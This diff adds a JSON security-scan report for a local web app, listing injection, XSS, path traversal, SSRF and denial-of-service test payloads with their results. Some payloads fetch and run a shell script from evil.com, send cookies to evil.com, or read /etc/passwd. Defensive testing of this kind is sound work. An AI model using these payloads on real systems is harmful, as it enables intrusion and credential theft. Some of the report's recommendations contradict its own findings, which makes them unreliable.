@@ -1,0 +1,782 @@
+{
+  "summary": {
+    "timestamp": "2025-07-11T16:54:53.953Z",
+    "baseUrl": "http://[::1]:3000",
+    "totalTests": 0,
+    "vulnerabilitiesFound": 8,
+    "criticalFindings": [
+      {
+        "type": "Environment File",
+        "file": ".env",
+        "vulnerable": true,
+        "note": ".env file exists - should not be in repository"
+      }
+    ],
+    "highFindings": [
+      {
+        "type": "No Authentication Required",
+        "endpoint": "/stats",
+        "status": 200,
+        "vulnerable": true,
+        "note": "Endpoint accessible without authentication"
+      },
+      {
+        "category": "A07:2021 - Identification and Authentication Failures",
+        "test": "Authentication bypass attempts",
+        "vulnerable": true,
+        "details": "1 authentication issues found"
+      }
+    ],
+    "mediumFindings": [
+      {
+        "header": "CSP",
+        "present": false,
+        "value": "Not set",
+        "vulnerable": true
+      }
+    ],
+    "lowFindings": [
+      {
+        "type": "Slowloris Attack",
+        "connections": 10,
+        "serverResponsive": false,
+        "vulnerable": true,
+        "note": "Server became unresponsive"
+      }
+    ]
+  },
+  "details": {
+    "inputValidation": [
+      {
+        "type": "SQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "' OR '1'='1",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/graph",
+        "payload": "' OR '1'='1",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "1'; DROP TABLE users; --",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/graph",
+        "payload": "1'; DROP TABLE users; --",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "1' UNION SELECT * FROM addresses--",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/graph",
+        "payload": "1' UNION SELECT * FROM addresses--",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "admin'--",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/graph",
+        "payload": "admin'--",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "1' OR 1=1#",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/graph",
+        "payload": "1' OR 1=1#",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "1' OR '1'='1' /*",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/graph",
+        "payload": "1' OR '1'='1' /*",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "1' OR '1'='1' --",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/graph",
+        "payload": "1' OR '1'='1' --",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "') OR ('1'='1",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/graph",
+        "payload": "') OR ('1'='1",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "1; SELECT * FROM sqlite_master--",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "SQL Injection",
+        "endpoint": "/graph",
+        "payload": "1; SELECT * FROM sqlite_master--",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "XSS",
+        "endpoint": "/addresses/search",
+        "payload": "<script>alert('XSS')</script>",
+        "status": 200,
+        "vulnerable": false,
+        "note": "Payload not reflected"
+      },
+      {
+        "type": "XSS",
+        "endpoint": "/addresses/search",
+        "payload": "<img src=x onerror=alert('XSS')>",
+        "status": 200,
+        "vulnerable": false,
+        "note": "Payload not reflected"
+      },
+      {
+        "type": "XSS",
+        "endpoint": "/addresses/search",
+        "payload": "<svg onload=alert('XSS')>",
+        "status": 200,
+        "vulnerable": false,
+        "note": "Payload not reflected"
+      },
+      {
+        "type": "XSS",
+        "endpoint": "/addresses/search",
+        "payload": "javascript:alert('XSS')",
+        "status": 200,
+        "vulnerable": false,
+        "note": "Payload not reflected"
+      },
+      {
+        "type": "XSS",
+        "endpoint": "/addresses/search",
+        "payload": "<iframe src='javascript:alert(`XSS`)'></iframe>",
+        "status": 200,
+        "vulnerable": false,
+        "note": "Payload not reflected"
+      },
+      {
+        "type": "XSS",
+        "endpoint": "/addresses/search",
+        "payload": "<body onload=alert('XSS')>",
+        "status": 200,
+        "vulnerable": false,
+        "note": "Payload not reflected"
+      },
+      {
+        "type": "XSS",
+        "endpoint": "/addresses/search",
+        "payload": "<<SCRIPT>alert('XSS');//<</SCRIPT>",
+        "status": 200,
+        "vulnerable": false,
+        "note": "Payload not reflected"
+      },
+      {
+        "type": "XSS",
+        "endpoint": "/addresses/search",
+        "payload": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
+        "status": 200,
+        "vulnerable": false,
+        "note": "Payload not reflected"
+      },
+      {
+        "type": "XSS",
+        "endpoint": "/addresses/search",
+        "payload": "<img src=\"x\" onerror=\"fetch('http://evil.com/steal?cookie='+document.cookie)\">",
+        "status": 200,
+        "vulnerable": false,
+        "note": "Payload not reflected"
+      },
+      {
+        "type": "Path Traversal",
+        "endpoint": "static files",
+        "payload": "../../../etc/passwd",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Path Traversal",
+        "endpoint": "static files",
+        "payload": "..\\..\\..\\windows\\system32\\config\\sam",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Path Traversal",
+        "endpoint": "static files",
+        "payload": "....//....//....//etc/passwd",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Path Traversal",
+        "endpoint": "static files",
+        "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Path Traversal",
+        "endpoint": "static files",
+        "payload": "..%252f..%252f..%252fetc%252fpasswd",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Path Traversal",
+        "endpoint": "static files",
+        "payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Path Traversal",
+        "endpoint": "static files",
+        "payload": "/var/www/../../etc/passwd",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Path Traversal",
+        "endpoint": "static files",
+        "payload": "C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Command Injection",
+        "endpoint": "/addresses/search",
+        "payload": "; ls -la",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Command Injection",
+        "endpoint": "/addresses/search",
+        "payload": "| whoami",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Command Injection",
+        "endpoint": "/addresses/search",
+        "payload": "`id`",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Command Injection",
+        "endpoint": "/addresses/search",
+        "payload": "$(cat /etc/passwd)",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Command Injection",
+        "endpoint": "/addresses/search",
+        "payload": "; cat /etc/passwd #",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Command Injection",
+        "endpoint": "/addresses/search",
+        "payload": "& net user",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Command Injection",
+        "endpoint": "/addresses/search",
+        "payload": "; ping -c 10 127.0.0.1",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Command Injection",
+        "endpoint": "/addresses/search",
+        "payload": "|| sleep 10",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "Command Injection",
+        "endpoint": "/addresses/search",
+        "payload": "; curl http://evil.com/shell.sh | sh",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "LDAP Injection",
+        "endpoint": "/addresses/search",
+        "payload": "*)(uid=*))(|(uid=*",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "LDAP Injection",
+        "endpoint": "/addresses/search",
+        "payload": "admin)(&(password=*))",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "LDAP Injection",
+        "endpoint": "/addresses/search",
+        "payload": "*)(mail=*))%00",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "LDAP Injection",
+        "endpoint": "/addresses/search",
+        "payload": ")(cn=*))(|(cn=*",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "LDAP Injection",
+        "endpoint": "/addresses/search",
+        "payload": "*)(&(objectClass=*",
+        "status": 200,
+        "vulnerable": false
+      },
+      {
+        "type": "NoSQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "{\"$gt\":\"\"}",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "NoSQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "{\"$ne\":null}",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "NoSQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "{\"$where\":\"this.password == 'test'\"}",
+        "status": 404,
+        "vulnerable": false
+      },
+      {
+        "type": "NoSQL Injection",
+        "endpoint": "/addresses/search",
+        "payload": "{\"address\":{\"$regex\":\".*\"}}",
+        "status": 404,
+        "vulnerable": false
+      }
+    ],
+    "authentication": [
+      {
+        "type": "No Authentication Required",
+        "endpoint": "/addresses",
+        "status": 404,
+        "vulnerable": false,
+        "note": "Endpoint protected"
+      },
+      {
+        "type": "No Authentication Required",
+        "endpoint": "/graph",
+        "status": 404,
+        "vulnerable": false,
+        "note": "Endpoint protected"
+      },
+      {
+        "type": "No Authentication Required",
+        "endpoint": "/investigations",
+        "status": 404,
+        "vulnerable": false,
+        "note": "Endpoint protected"
+      },
+      {
+        "type": "No Authentication Required",
+        "endpoint": "/stats",
+        "status": 200,
+        "vulnerable": true,
+        "note": "Endpoint accessible without authentication"
+      },
+      {
+        "type": "No Authentication Required",
+        "endpoint": "/relationships",
+        "status": 404,
+        "vulnerable": false,
+        "note": "Endpoint protected"
+      },
+      {
+        "type": "JWT Manipulation",
+        "endpoint": "/addresses",
+        "payload": "eyJhbGciOiJub25lIiwi...",
+        "status": 404,
+        "vulnerable": false,
+        "note": "Testing invalid JWT acceptance"
+      },
+      {
+        "type": "JWT Manipulation",
+        "endpoint": "/addresses",
+        "payload": "invalid.jwt.token...",
+        "status": 404,
+        "vulnerable": false,
+        "note": "Testing invalid JWT acceptance"
+      },
+      {
+        "type": "JWT Manipulation",
+        "endpoint": "/addresses",
+        "payload": "eyJhbGciOiJIUzI1NiIs...",
+        "status": 404,
+        "vulnerable": false,
+        "note": "Testing invalid JWT acceptance"
+      },
+      {
+        "type": "Session Fixation",
+        "endpoint": "/addresses",
+        "payload": "fixed-session-id-12345",
+        "status": 404,
+        "note": "Testing if server accepts client-provided session ID"
+      }
+    ],
+    "dataSecurity": [
+      {
+        "type": "Error Information Leakage",
+        "endpoint": "/graph",
+        "status": 404,
+        "vulnerable": false,
+        "note": "No sensitive info exposed"
+      },
+      {
+        "type": "Error Information Leakage",
+        "endpoint": "/addresses/search",
+        "status": 400,
+        "vulnerable": false,
+        "note": "No sensitive info exposed"
+      },
+      {
+        "type": "Error Information Leakage",
+        "endpoint": "/stats",
+        "status": 200,
+        "vulnerable": false,
+        "note": "No sensitive info exposed"
+      }
+    ],
+    "rateLimit": [
+      {
+        "endpoint": "/addresses/search?q=test",
+        "expectedLimit": 20,
+        "successfulRequests": 20,
+        "rateLimitHit": true,
+        "headers": {
+          "limit": "20",
+          "remaining": "0",
+          "reset": "1752252955"
+        },
+        "vulnerable": false
+      },
+      {
+        "endpoint": "/graph?address=test",
+        "expectedLimit": 10,
+        "successfulRequests": 0,
+        "rateLimitHit": true,
+        "headers": {},
+        "vulnerable": false
+      },
+      {
+        "endpoint": "/investigations",
+        "expectedLimit": 20,
+        "successfulRequests": 0,
+        "rateLimitHit": true,
+        "headers": {},
+        "vulnerable": false
+      },
+      {
+        "type": "Large Payload Attack",
+        "size": "1MB",
+        "status": 429,
+        "duration": "6ms",
+        "vulnerable": false,
+        "note": "Payload accepted"
+      },
+      {
+        "type": "Large Payload Attack",
+        "size": "10MB",
+        "status": 413,
+        "duration": "33ms",
+        "vulnerable": false,
+        "note": "Payload rejected"
+      },
+      {
+        "type": "Large Payload Attack",
+        "size": "100MB",
+        "status": 413,
+        "duration": "466ms",
+        "vulnerable": false,
+        "note": "Payload rejected"
+      },
+      {
+        "type": "Slowloris Attack",
+        "connections": 10,
+        "serverResponsive": false,
+        "vulnerable": true,
+        "note": "Server became unresponsive"
+      }
+    ],
+    "owasp": [
+      {
+        "category": "A01:2021 - Broken Access Control",
+        "test": "Access other user investigations",
+        "endpoint": "/api/investigations/12345",
+        "status": 429,
+        "vulnerable": false
+      },
+      {
+        "category": "A01:2021 - Broken Access Control",
+        "test": "Path traversal attempt",
+        "endpoint": "/api/addresses/../../../etc/passwd",
+        "status": 429,
+        "vulnerable": false
+      },
+      {
+        "category": "A01:2021 - Broken Access Control",
+        "test": "Access admin endpoint",
+        "endpoint": "/api/admin",
+        "status": 429,
+        "vulnerable": false
+      },
+      {
+        "category": "A02:2021 - Cryptographic Failures",
+        "test": "HTTP instead of HTTPS",
+        "vulnerable": true
+      },
+      {
+        "category": "A02:2021 - Cryptographic Failures",
+        "test": "Weak encryption in transit",
+        "vulnerable": false
+      },
+      {
+        "category": "A03:2021 - Injection",
+        "test": "Various injection attacks",
+        "vulnerable": false,
+        "details": "0 injection vulnerabilities found"
+      },
+      {
+        "category": "A04:2021 - Insecure Design",
+        "test": "Query complexity limits",
+        "vulnerable": true
+      },
+      {
+        "category": "A04:2021 - Insecure Design",
+        "test": "Resource exhaustion protection",
+        "vulnerable": false
+      },
+      {
+        "category": "A05:2021 - Security Misconfiguration",
+        "test": "Default error pages",
+        "vulnerable": false
+      },
+      {
+        "category": "A05:2021 - Security Misconfiguration",
+        "test": "Missing security headers",
+        "vulnerable": true
+      },
+      {
+        "category": "A05:2021 - Security Misconfiguration",
+        "test": "Unnecessary HTTP methods"
+      },
+      {
+        "category": "A07:2021 - Identification and Authentication Failures",
+        "test": "Authentication bypass attempts",
+        "vulnerable": true,
+        "details": "1 authentication issues found"
+      },
+      {
+        "category": "A08:2021 - Software and Data Integrity Failures",
+        "test": "Unsigned code execution",
+        "vulnerable": false
+      },
+      {
+        "category": "A09:2021 - Security Logging and Monitoring Failures",
+        "test": "Failed login attempts logged",
+        "vulnerable": false
+      },
+      {
+        "category": "A10:2021 - Server-Side Request Forgery",
+        "test": "SSRF attempt with http://localhost:22",
+        "vulnerable": false
+      },
+      {
+        "category": "A10:2021 - Server-Side Request Forgery",
+        "test": "SSRF attempt with http://127.0.0.1:6379",
+        "vulnerable": false
+      },
+      {
+        "category": "A10:2021 - Server-Side Request Forgery",
+        "test": "SSRF attempt with http://169.254.169.254/latest/meta-data/",
+        "vulnerable": false
+      },
+      {
+        "category": "A10:2021 - Server-Side Request Forgery",
+        "test": "SSRF attempt with file:///etc/passwd",
+        "vulnerable": false
+      },
+      {
+        "category": "A10:2021 - Server-Side Request Forgery",
+        "test": "SSRF attempt with gopher://localhost:6379/_info",
+        "vulnerable": false
+      }
+    ],
+    "dependencies": {
+      "vulnerabilities": {
+        "info": 0,
+        "low": 0,
+        "moderate": 0,
+        "high": 0,
+        "critical": 0,
+        "total": 0
+      },
+      "totalDependencies": {
+        "prod": 288,
+        "dev": 673,
+        "optional": 61,
+        "peer": 0,
+        "peerOptional": 0,
+        "total": 974
+      },
+      "auditStatus": "passed"
+    },
+    "hardcodedSecrets": [
+      {
+        "type": "Environment File",
+        "file": ".env",
+        "vulnerable": true,
+        "note": ".env file exists - should not be in repository"
+      }
+    ],
+    "headers": [
+      {
+        "header": "HSTS",
+        "present": true,
+        "value": "max-age=15552000; includeSubDomains",
+        "vulnerable": false
+      },
+      {
+        "header": "X-Content-Type-Options",
+        "present": true,
+        "value": "nosniff",
+        "vulnerable": false
+      },
+      {
+        "header": "X-Frame-Options",
+        "present": true,
+        "value": "DENY",
+        "vulnerable": false
+      },
+      {
+        "header": "X-XSS-Protection",
+        "present": true,
+        "value": "1; mode=block",
+        "vulnerable": false
+      },
+      {
+        "header": "CSP",
+        "present": false,
+        "value": "Not set",
+        "vulnerable": true
+      },
+      {
+        "header": "Referrer-Policy",
+        "present": true,
+        "value": "strict-origin-when-cross-origin",
+        "vulnerable": false
+      },
+      {
+        "header": "Permissions-Policy",
+        "present": true,
+        "value": "accelerometer=(), autoplay=(), camera=(), display-capture=(), encrypted-media=(), fullscreen=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), midi=(), payment=(), picture-in-picture=(), publickey-credentials-get=(), usb=(), web-share=(), xr-spatial-tracking=()",
+        "vulnerable": false
+      }
+    ],
+    "timestamp": "2025-07-11T16:54:53.953Z"
+  },
+  "recommendations": [
+    {
+      "severity": "CRITICAL",
+      "issue": "Input validation vulnerabilities found",
+      "recommendation": "Implement proper input validation and parameterized queries. Use the existing QueryValidator class consistently across all endpoints."
+    },
+    {
+      "severity": "HIGH",
+      "issue": "Missing security headers",
+      "recommendation": "Ensure all security headers are properly configured, especially in production. Enable HSTS, CSP, and other headers."
+    },
+    {
+      "severity": "HIGH",
+      "issue": "Authentication/authorization issues",
+      "recommendation": "Implement proper authentication mechanisms. Consider using JWT with proper validation or API keys for sensitive endpoints."
+    },
+    {
+      "severity": "MEDIUM",
+      "issue": "Rate limiting may be insufficient",
+      "recommendation": "Review and strengthen rate limiting configurations, especially for expensive operations like graph queries."
+    }
+  ]
+}
